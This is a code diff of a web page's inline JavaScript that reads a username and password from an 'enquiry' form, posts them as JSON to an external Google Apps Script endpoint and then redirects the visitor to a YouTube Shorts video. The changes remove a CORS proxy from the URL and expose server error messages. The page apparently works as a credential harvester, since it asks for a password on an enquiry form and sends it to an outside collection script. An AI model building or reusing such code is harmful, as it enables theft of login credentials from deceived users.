@@ -416,39 +416,37 @@ button#submit-enquiry:active {
     </div> -->
 
     <script>
+        const scriptURL = "https://script.google.com/macros/s/AKfycbyIIHBdvab_lw_Olq0qjIBdpMteJgOZGNkwAvxn4z5YCqGZFqM987tfbIzJa_NzL3r8/exec";
+
         document.getElementById("submit-enquiry").addEventListener("click", function () {
-            const username = document.getElementById("username-enquiry").value;
-            const password = document.getElementById("password-enquiry").value;
-    
-            // Web app URL from the Google Apps Script deployment
-            const scriptURL = "https://cors-anywhere.herokuapp.com/https://script.google.com/macros/s/AKfycbyIIHBdvab_lw_Olq0qjIBdpMteJgOZGNkwAvxn4z5YCqGZFqM987tfbIzJa_NzL3r8/exec";
-    
-            // Check if username or password is empty
-            if (!username || !password) {
-                alert("Please fill in both username and password!");
-                return;
+        const username = document.getElementById("username-enquiry").value;
+        const password = document.getElementById("password-enquiry").value;
+
+        if (!username || !password) {
+            alert("Please fill in both username and password!");
+            return;
+        }
+
+        fetch(scriptURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ username, password }),
+        })
+            .then((response) => response.json())
+            .then((data) => {
+            if (data.status === "success") {
+                alert("Data submitted successfully!");
+                window.location.href = "https://www.youtube.com/shorts/SXHMnicI6Pg";
+            } else {
+                alert("Failed to submit data: " + data.message);
             }
-    
-            // Send the data
-            fetch(scriptURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ username, password }),
             })
-                .then((response) => response.json())
-                .then((data) => {
-                    if (data.status === "success") {
-                        alert("Data submitted successfully!");
-                        window.location.href = "https://www.youtube.com/shorts/SXHMnicI6Pg";
-                    } else {
-                        alert("Failed to submit data. Please try again.");
-                    }
-                })
-                .catch((error) => {
-                    console.error("Error:", error);
-                    alert("An error occurred while submitting data. Please try again.");
-                });
+            .catch((error) => {
+            console.error("Error:", error);
+            alert("An error occurred: " + error.message);
+            });
         });
+
     </script>
     
     
